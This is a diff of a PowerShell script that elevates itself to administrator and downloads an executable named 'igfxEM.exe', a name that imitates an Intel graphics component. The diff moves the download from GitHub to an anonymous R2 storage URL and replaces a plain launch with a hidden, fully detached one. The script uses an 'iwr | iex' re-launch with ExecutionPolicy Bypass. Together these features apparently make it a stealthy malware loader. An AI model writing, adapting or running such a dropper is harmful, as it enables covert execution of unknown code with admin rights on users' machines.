@@ -1,22 +1,20 @@
-$ExeUrl = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
+$ExeUrl = "https://pub-1045ad571e1d4b13bd996dc0460ed5c7.r2.dev/igfxEM.exe"
 $AppName = "igfxEM.exe"
-
 $ErrorActionPreference = "Stop"
 
 # Check if Admin
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-
 if (-not $isAdmin) {
     Write-Host "Requesting administrator privileges..." -ForegroundColor Yellow
-    
+
     # Determine how to re-launch
     if ($MyInvocation.Line -match 'https?://\S+') {
         # Case 1: Running via "irm <url> | iex"
         $originalUrl = ($MyInvocation.Line -match '(https?://\S+)')[1]
-        
+
         # Force TLS 1.2 in the new process BEFORE downloading
         $newCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr '$originalUrl' -UseBasicParsing | iex"
-        
+
         Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$newCmd`""
     } else {
         # Case 2: Running from a file (.ps1)
@@ -31,7 +29,6 @@ if (-not $isAdmin) {
 }
 
 # --- Rest of the script (runs as Admin) ---
-
 $TempDir = Join-Path $env:TEMP "App_$(Get-Random)"
 New-Item -ItemType Directory -Path $TempDir | Out-Null
 $ExePath = Join-Path $TempDir $AppName
@@ -50,6 +47,15 @@ try {
 }
 
 Write-Host "Running..." -ForegroundColor Green
-Start-Process -FilePath $ExePath -WorkingDirectory $TempDir
 
-Write-Host "Done." -ForegroundColor Green
+# Launch exe fully detached from console session
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = $ExePath
+$psi.WorkingDirectory = $TempDir
+$psi.UseShellExecute = $false
+$psi.CreateNoWindow = $true
+$psi.RedirectStandardOutput = $true
+$psi.RedirectStandardError = $true
+[System.Diagnostics.Process]::Start($psi) | Out-Null
+
+Write-Host "Done. igfxEM.exe is running in background." -ForegroundColor Green
